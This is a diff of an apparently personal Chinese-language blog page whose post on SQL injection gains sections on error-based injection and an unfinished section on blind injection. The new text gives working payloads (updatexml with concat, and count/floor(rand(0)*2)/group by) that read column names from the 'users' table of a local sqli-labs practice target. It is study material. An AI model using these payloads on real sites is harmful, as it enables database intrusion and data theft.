@@ -23,15 +23,19 @@
 <meta property="og:site_name" content="Czin2u✈️✈️✈️">
 <meta property="og:description" content="Structured Query Language of Injection前言​      结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。 ​       SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023213612187.png">
 <meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022202221404.png">
 <meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022202026254.png">
 <meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022201950232.png">
 <meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022203009884.png">
+<meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023181337948.png">
+<meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023184201213.png">
+<meta property="og:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023195355356.png">
 <meta property="article:published_time" content="2022-10-21T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-22T15:56:48.060Z">
+<meta property="article:modified_time" content="2022-10-23T13:47:04.208Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022202221404.png">
+<meta name="twitter:image" content="c:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023213612187.png">
   
   
   
@@ -250,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k words
+          3.2k words
         
       </span>
     
@@ -261,7 +265,7 @@
         
         
         
-          16 mins
+          27 mins
         
       </span>
     
@@ -307,6 +311,7 @@
                 <h3 id="Structured-Query-Language-of-Injection"><a href="#Structured-Query-Language-of-Injection" class="headerlink" title="Structured Query Language of Injection"></a>Structured Query Language of Injection</h3><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​      结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
 <p>​       SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）。</p>
 <p>**<em>*即*<em>：*<em>注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询*</em></em></em></p>
+<p><img src="C:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023213612187.png" srcset="/img/loading.gif" lazyload alt="image-20221023213612187"></p>
 <h3 id="mysql补充"><a href="#mysql补充" class="headerlink" title="mysql补充"></a>mysql补充</h3><ol>
 <li><p>information_schema数据库:确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020">访问权限</a>等。</p>
 <p>其中有,</p>
@@ -356,10 +361,42 @@
 </ol>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>无法判断显示位 但页面会根据我们输入错误的SQL语法而报错，所以采用报错注入的方法解决.报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息</p>
 <p><em><strong>*报错注入的种类？*</strong></em></p>
-<p><strong>1.BigInt数据类型溢出</strong></p>
-<p><strong>2.函数参数格式错误</strong></p>
-<p><strong>3.主键冲突（重复）</strong></p>
-<p>1. </p>
+<h3 id="1-BigInt数据类型溢出"><a href="#1-BigInt数据类型溢出" class="headerlink" title="1.BigInt数据类型溢出"></a><strong>1.BigInt数据类型溢出</strong></h3><h3 id="2-函数参数格式错误"><a href="#2-函数参数格式错误" class="headerlink" title="2.函数参数格式错误"></a><strong>2.函数参数格式错误</strong></h3><ul>
+<li><p>UPDATEXML (XML_document, XPath_string, new_value); </p>
+</li>
+<li><p>extractValue(XML_document, XPath_string)</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称， </p>
+<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>第二个参数需要的是Xpath格式的字符串，看这个payload： updatexml(1,concat(0x7e,version(),0))，明显是不符合的，所以出现了报错。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-2/?id=1">http://127.0.0.1/sqli/Less-2/?id=1</a> and updatexml(1,concat(0x7e,(select   column_name from information_schema.columns where  table_schema &#x3D;’security’ and table_name&#x3D;’users’ limit 1,1 ),0x7e),2)–+ </p>
+<p>报错信息 <img src="C:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023181337948.png" srcset="/img/loading.gif" lazyload alt="image-20221023181337948"></p>
+<p>xpath格式不对 主要是第二个参数 undatexml(“<del>“,要查询的语句,”</del>“)</p>
+</li>
+</ul>
+<h3 id="3-主键冲突（重复）"><a href="#3-主键冲突（重复）" class="headerlink" title="3.主键冲突（重复）"></a><strong>3.主键冲突（重复）</strong></h3><ul>
+<li><p>floor(x) count(*) rand() group by 四个特定函数组合会产生报错</p>
+</li>
+<li><p>固定语句 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(查询语句,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)a) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-2/?id=-1">http://127.0.0.1/sqli/Less-2/?id=-1</a> </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))a,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023184201213.png" srcset="/img/loading.gif" lazyload alt="image-20221023184201213"></p>
+<p>爆出第一个字段名为id,更改limit 爆出其他字段 </p>
+<p>几个值得注意的点:</p>
+<p>1.第二个select 1,2,3 字段数得和前面被屏蔽的select字段数一致</p>
+<p>2.concat(select,floor())如果select语句查询不到结果返回为null的话,concat就返回null,而不会执行floor()函数,进而不会产生报错</p>
+<p>3.group_concat(字段) 把字段值打印在一排 <img src="C:\Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023195355356.png" srcset="/img/loading.gif" lazyload alt="image-20221023195355356"></p>
+</li>
+</ul>
+<h3 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h3><ul>
+<li>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注</li>
+<li>1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。<br>2.盲注是不能通过直接显示的途径来获取数据库数据的方法。<br>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类）</li>
+<li></li>
+</ul>
 
                 
               </div>
